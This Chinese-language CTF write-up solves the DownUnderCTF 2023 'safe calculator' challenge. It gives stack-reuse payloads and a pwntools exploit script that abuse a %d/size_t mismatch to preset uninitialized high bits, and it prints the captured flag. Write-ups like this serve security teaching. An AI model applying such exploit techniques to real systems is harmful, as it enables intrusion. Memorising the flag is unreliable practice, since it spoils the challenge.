# DownUnderCTF 2023 safe calculator Writeup

## 题目简述

程序把字符串中的两个十进制数用 `%d` 解析到两个 64 位 `size_t` 变量中。`%d` 只写低 32 位，高 32 位保留为未初始化栈数据。另一个“review”功能可在相同栈帧位置写入可控字节，因此能够预置两个操作数的高半部，使和等于隐藏常量。

## 解题过程

反汇编可确认 `calculate` 的布局：`arg1` 位于 `[rbp-0x20]`，`arg2` 位于 `[rbp-0x18]`。低 32 位固定为：

```text
arg1.low = 7664 = 0x1df0
arg2.low = 1337 = 0x0539
```

所以低半部之和是 `0x2329`。目标常量为：

```text
0xb98c5f3700002329
```

需要让两个未初始化高半部之和等于 `0xb98c5f37`。`leave_review` 的 48 字节缓冲区从 `[rbp-0x40]` 开始，与下一次 `calculate` 的局部变量复用同一段栈内存。

第一次 review 发送：

```python
payload1 = b"A" * 36 + b"X" * 8 + b"A.ZX"
```

它在未来 `arg2.high` 的位置留下小端值 `0x585a2e41`。第二次 review 只发送 44 字节：

```python
payload2 = b"A" * 36 + b"712aXXXX"
```

`712a` 在未来 `arg1.high` 位置形成 `0x61323137`；`scanf` 自动追加的 NUL 位于未来 `arg2.high` 首字节，把先前的 `0x585a2e41` 改成 `0x585a2e00`。于是：

$$
0x61323137+0x585a2e00=0xb98c5f37.
$$

完整交互顺序为两次选择 review，再选择 calculator：

```python
from pwn import *

io = process("./safe-calculator")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Leave a review! : ", payload1)
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Leave a review! : ", payload2)
io.sendlineafter(b"> ", b"1")
io.sendline(b"cat flag.txt")
io.interactive()
```

检查通过并进入 `win()`，得到：

```text
DUCTF{d1d_y0u_p0p_c4lc?}
```

## 方法总结

漏洞不是传统返回地址覆盖，而是格式说明符与目标类型不匹配导致的部分初始化。局部变量栈槽会被后续函数复用，攻击者可通过另一功能预置未写入的高 32 位。解析整数时应使用与目标类型匹配的 `%zu`，并在使用前显式初始化变量。
